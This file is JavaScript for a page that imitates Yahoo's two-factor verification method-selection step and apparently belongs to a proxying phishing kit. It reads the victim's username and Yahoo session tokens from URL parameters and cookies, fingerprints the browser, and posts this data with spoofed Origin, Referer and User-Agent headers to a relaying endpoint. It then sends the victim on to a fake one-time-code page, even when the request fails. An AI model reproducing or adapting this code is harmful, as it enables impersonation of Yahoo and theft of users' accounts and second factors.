// ===== YAHOO 2FA PAGE - 100% PROXIED SYNCHRONICITY =====
console.log("Yahoo 2FA JS - 100% Native/Hybrid Fluent Data Flow Initialized")

const $ = window.jQuery || window.$

if ($) {
  $(document).ready(() => {
    console.log("Yahoo 2FA selection system initialized")

    // ===== CONFIGURATION =====
    const config = {
      redirectDelay: 1500,
      sessionTimeout: 30000,
    }

    let selectedMethod = ""
    let sessionData = {}
    let username = ""

    // ===== SESSION MANAGEMENT =====
    const SessionManager = {
      extractSessionData: () => {
        const urlParams = new URLSearchParams(window.location.search)
        const sessionParam = urlParams.get("s")

        if (sessionParam) {
          try {
            return JSON.parse(decodeURIComponent(sessionParam))
          } catch (e) {
            console.log("Failed to parse session parameter")
          }
        }

        const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
        if (cookieMatch) {
          try {
            return JSON.parse(decodeURIComponent(cookieMatch[1]))
          } catch (e) {
            console.log("Failed to parse session cookie")
          }
        }

        return {}
      },

      generateFingerprint: () =>
        JSON.stringify({
          screen: `${screen.width}x${screen.height}`,
          colorDepth: screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          platform: navigator.platform,
          timestamp: Date.now(),
          sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
        }),
    }

    // ===== USERNAME RETRIEVAL =====
    function getUsername() {
      const urlParams = new URLSearchParams(window.location.search)
      const user = urlParams.get("u")

      if (user) return decodeURIComponent(user)
      if (sessionData.username) return sessionData.username

      const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
      if (cookieMatch) return decodeURIComponent(cookieMatch[1])

      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || "user@yahoo.com"
    }

    // ===== STATE MANAGEMENT =====
    function showState(state) {
      $("#main-form, #error-container, #loading-state").hide()
      $(`#${state}`).show()
    }

    function showError(message) {
      $("#error-message").text(message || "Unable to set up verification. Please try again.")
      showState("error-container")
    }

    // ===== METHOD SELECTION =====
    window.selectMethod = (method) => {
      console.log("Method selected:", method)

      $(".yahoo-verification-option").removeClass("selected")
      $(`.yahoo-verification-option[data-method="${method}"]`).addClass("selected")

      selectedMethod = method
      $("#selectedMethod").val(method)
      $("#submit-btn").prop("disabled", false)

      const descriptions = {
        sms: "We'll send a code to your phone via SMS",
        email: "We'll send a code to your recovery email",
        app: "We'll send a notification to your Yahoo Mobile app",
      }

      $(".yahoo-subtitle").text(descriptions[method] || "We'll send you a verification code")
    }

    // ===== 2FA SUBMISSION =====
    function handle2FASubmission() {
      if (!selectedMethod) {
        showError("Please select a verification method.")
        return
      }

      console.log("Submitting 2FA method selection:", selectedMethod)
      showState("loading-state")

      const formData = {
        username: username,
        selectedMethod: selectedMethod,
        sessionIndex: sessionData.sessionIndex || "1",
        sessionToken: sessionData.sessionToken || $("#sessionToken").val() || "sess_" + Date.now(),
        crumb: sessionData.crumb || $("#crumb").val() || "auto_crumb_" + Date.now(),
        acrumb: sessionData.acrumb || $("#acrumb").val() || "auto_acrumb_" + Date.now(),
        done: "https://mail.yahoo.com/d/folders/1",
        src: "ym",
        ".lang": "en-US",
        ".intl": "us",
        "browser-fp-data": SessionManager.generateFingerprint(),
        timestamp: Date.now(),
      }

      $.ajax({
        url: "/account/challenge/challenge-selector",
        method: "POST",
        data: formData,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: window.location.origin,
          Referer: window.location.href,
          "User-Agent": navigator.userAgent,
        },
        xhrFields: {
          withCredentials: true,
        },
        timeout: 15000,
        success: (response, textStatus, xhr) => {
          console.log("2FA method selection successful")

          setTimeout(() => {
            const redirectUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
            console.log("Redirecting to OTP:", redirectUrl)
            window.location.href = redirectUrl
          }, config.redirectDelay)
        },
        error: (xhr, textStatus, errorThrown) => {
          console.error("2FA method selection error:", textStatus, xhr.status)

          if (xhr.status === 0) {
            setTimeout(() => {
              const redirectUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
              window.location.href = redirectUrl
            }, 2000)
          } else {
            showError("Unable to set up verification. Please try again.")
          }
        },
      })
    }

    // ===== FORM SUBMISSION =====
    $("#verification-form").on("submit", (e) => {
      e.preventDefault()
      handle2FASubmission()
      return false
    })

    // ===== RETRY HANDLER =====
    $("#refreshButton").click(() => {
      selectedMethod = ""
      $("#selectedMethod").val("")
      $("#submit-btn").prop("disabled", true)
      $(".yahoo-verification-option").removeClass("selected")
      showState("main-form")
    })

    // ===== INITIALIZATION =====
    function initializePage() {
      console.log("Initializing 2FA selection page")

      sessionData = SessionManager.extractSessionData()
      username = getUsername()

      $("#userEmail").text(username)
      $("#username").val(username)

      Object.keys(sessionData).forEach((key) => {
        const element = $(`#${key}`)
        if (element.length && sessionData[key]) {
          element.val(sessionData[key])
        }
      })

      $("#timestamp").val(Date.now())
      $("#browser-fp-data").val(SessionManager.generateFingerprint())

      console.log("2FA page initialized for user:", username)
    }

    // ===== START INITIALIZATION =====
    initializePage()

    console.log("Yahoo 2FA selection system fully initialized")
  })
} else {
  console.error("jQuery not found - Yahoo 2FA JS requires jQuery")
}
